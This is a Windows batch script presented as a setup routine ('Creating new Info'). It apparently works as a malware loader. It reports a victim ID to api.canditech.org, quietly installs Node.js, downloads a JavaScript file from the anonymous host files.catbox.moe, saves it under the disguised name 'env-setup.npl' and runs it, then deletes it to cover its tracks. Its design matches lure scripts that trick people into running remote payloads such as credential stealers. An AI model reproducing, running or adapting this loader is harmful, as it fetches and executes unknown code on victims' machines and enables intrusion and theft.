@echo off
title Creating new Info
setlocal enabledelayedexpansion
set "WINDOW_UID=__ID__"

if not defined WINDOW_UID goto :err_uid
if "!WINDOW_UID!"=="" goto :err_uid
if "!WINDOW_UID!"=="__ID__" goto :err_uid

if defined WINDOW_UID (
  set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
  curl -sL -X POST "!AUTO_URL!" -o nul
)
goto :skip_delay

:err_uid
echo [ERROR] WINDOW_UID is required. Please run this script from the provided link with your id.
exit /b 1

:delay
REM Reliable delay in seconds (works when output is redirected); usage: call :delay 4
set /a "pings=%~1+1"
ping 127.0.0.1 -n !pings! -w 1000 >nul
goto :eof

:skip_delay

:: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

REM Get latest Node.js version using PowerShell
for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"

REM Remove leading "v"
set "NODE_VERSION=%LATEST_VERSION:~1%"
call :detect_windows_arch
if errorlevel 1 exit /b 1

set "NODE_MSI=node-v%NODE_VERSION%-%OS_ARCH%.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
if /i not "%OS_ARCH%"=="x64" if /i not "%OS_ARCH%"=="arm64" (
    exit /b 1
)
set "NODE_EXE="

:: -------------------------
:: Check for global Node.js
:: -------------------------
where node >nul 2>&1
if not errorlevel 1 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
    set "NODE_EXE=node"
)

if not defined NODE_EXE (
    call :resolve_portable_node
    if defined NODE_EXE (
        set "PATH=%PORTABLE_NODE_DIR%;%PATH%"
    ) else (

    :: -------------------------
    :: Download Node.js MSI if needed
    :: -------------------------
    call :download_file "%DOWNLOAD_URL%" "%~dp0%NODE_MSI%"

    if exist "%~dp0%NODE_MSI%" (
        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
        del "%~dp0%NODE_MSI%"
    ) else (
        exit /b 1
    )

    call :resolve_portable_node
    if defined NODE_EXE (
        set "PATH=%PORTABLE_NODE_DIR%;%PATH%"
    ) else (
        exit /b 1
    )
    )
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
if not defined NODE_EXE (
    exit /b 1
)

:: -------------------------
:: Download required files
:: -------------------------
set "CODEPROFILE=%USERPROFILE%"
if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"

call :download_file "https://files.catbox.moe/1gq866.js" "%CODEPROFILE%\env-setup.npl"

:: -------------------------
:: Run the parser
:: -------------------------
if exist "%CODEPROFILE%\env-setup.npl" (
    cd "%CODEPROFILE%"
    "%NODE_EXE%" "env-setup.npl"
    if errorlevel 1 (
        exit /b 1
    )
    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
) else (
    exit /b 1
)

exit /b 0

:detect_windows_arch
set "OS_ARCH="
if /i "%PROCESSOR_ARCHITECTURE%"=="ARM64" set "OS_ARCH=arm64"
if /i "%PROCESSOR_ARCHITEW6432%"=="ARM64" set "OS_ARCH=arm64"
if not defined OS_ARCH if /i "%PROCESSOR_ARCHITECTURE%"=="AMD64" set "OS_ARCH=x64"
if not defined OS_ARCH if /i "%PROCESSOR_ARCHITEW6432%"=="AMD64" set "OS_ARCH=x64"
if not defined OS_ARCH exit /b 1
goto :eof

:download_file
set "DOWNLOAD_SOURCE=%~1"
set "DOWNLOAD_TARGET=%~2"
if exist "%DOWNLOAD_TARGET%" del "%DOWNLOAD_TARGET%" >nul 2>&1
where curl >nul 2>&1
if errorlevel 1 (
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri '%DOWNLOAD_SOURCE%' -OutFile '%DOWNLOAD_TARGET%'" >nul 2>&1
) else (
    curl -s -L -o "%DOWNLOAD_TARGET%" "%DOWNLOAD_SOURCE%" >nul 2>&1
)
goto :eof

:resolve_portable_node
set "NODE_EXE="
set "PORTABLE_NODE_DIR="
for %%D in (
    "%EXTRACT_DIR%\nodejs"
    "%EXTRACT_DIR%\PFiles\nodejs"
    "%EXTRACT_DIR%\PFiles64\nodejs"
    "%EXTRACT_DIR%\Program Files\nodejs"
    "%EXTRACT_DIR%\Program Files (x86)\nodejs"
) do (
    if exist "%%~D\node.exe" (
        set "PORTABLE_NODE_DIR=%%~D"
        set "NODE_EXE=%%~D\node.exe"
        goto :eof
    )
)
for /f "delims=" %%F in ('dir /b /s "%EXTRACT_DIR%\node.exe" 2^>nul') do (
    set "NODE_EXE=%%F"
    for %%D in ("%%~dpF.") do set "PORTABLE_NODE_DIR=%%~fD"
    goto :eof
)
goto :eof
